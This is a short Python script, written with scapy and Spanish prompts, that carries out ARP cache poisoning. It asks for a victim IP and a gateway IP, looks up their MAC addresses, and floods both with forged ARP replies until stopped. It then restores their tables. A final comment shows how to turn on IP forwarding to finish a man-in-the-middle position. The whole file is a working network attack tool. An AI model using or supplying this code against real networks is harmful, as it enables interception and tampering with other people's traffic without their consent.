from scapy.all import *

def get_mac(target_ip):
	arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
	targetmac = srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
	return targetmac

def spoof_arp_cache(target_ip, target_mac, source_ip):
	spoofed= ARP(op=2 , pdst=target_ip, psrc=source_ip, hwdst= target_mac)
	send(spoofed, verbose= False)

def restore_arp(targetip, targetmac, sourceip, sourcemac):
	packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
	send(packet, verbose=False)
	print("La tabla ARP restoreada "+ targetip)

def main():
	targetip= input("Ingresar IP victima:")
	gatewayip= input("Ingresar IP del gateway:")

	try:
		targetmac= get_mac(targetip)
		print("MAC de la victima: "+ targetmac)
	except:
		print("La maquina victima no responde al brodcast de ARP")
		quit()

	try:
		gatewaymac= get_mac(gatewayip)
		print("MAC del gateway: "+gatewaymac)
	except:
		print("Gateway no es encontrado")
		quit()
	try:
		print("Enviando Respuestas ARP modificadas")
		while True:
			spoof_arp_cache(targetip, targetmac, gatewayip)
			spoof_arp_cache(gatewayip, gatewaymac, targetip)
	except KeyboardInterrupt:
		print("Finalizó el envenenamiento de ARP")
		restore_arp(gatewayip, gatewaymac, targetip, targetmac)
		restore_arp(targetip, targetmac, gatewayip, gatewaymac)
		quit()

if __name__=="__main__":
	main()

# Para habilitar el forwarding de IP: echo 1 > /proc/sys/net/ipv4/ip_forward